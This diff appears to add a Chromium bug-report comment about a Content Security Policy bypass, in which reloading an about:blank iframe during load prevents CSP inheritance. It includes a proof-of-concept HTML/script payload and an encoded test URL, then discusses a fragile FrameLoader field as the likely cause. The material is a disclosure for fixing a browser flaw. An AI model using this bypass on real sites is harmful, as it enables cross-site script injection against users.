@@ -1,0 +1,28 @@
+It is possible to prevent CSP inheritance by reloading the about:blank document while it is loading:
+
+Payload:
+
+CSP-parent: frame-src 'none'; script-src 'nonce-1337'
+```
+HTML: <iframe id=x src=about:blank></iframe>
+      <script nonce=1337>
+          x.onload=_=>x.contentDocument.body.innerHTML="<iframe/onload=alert(location.href)>"
+          x.contentWindow.location.reload();
+      </script>
+```
+
+http://terjanq.me/xss.php?csp=frame-src%20%27none%27;script-src%20%27nonce-1337%27&html=%3Ciframe%20id=x%20src=about:blank%3E%3C/iframe%3E%20%3Cscript%20nonce=1337%3E%20x.onload=_=%3Ex.contentDocument.body.innerHTML=%22%3Ciframe/onload=alert(location.href)%3E%22;%20x.contentWindow.location.reload();%20%3C/script%3E
+
+I would bet POC to be caused by a very fragile construct in FrameLoader.
+I warned us when I saw this and added a TODO:
+
+----
+  // The CSP of the latest document that has initiated a navigation in this
+  // frame. TODO(arthursonzogni): This looks fragile. The FrameLoader might be
+  // confused by several navigations submitted in a row.
+  Member<ContentSecurityPolicy> last_origin_window_csp_;
+```
+
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/loader/frame_loader.h?type=cs&q=+%22TODO(arthursonzogni):+This+looks+fragile%22&g=0&l=330
+
+I don't think it's easy to fix this problem. Now we have a POC, we can surely improve things.
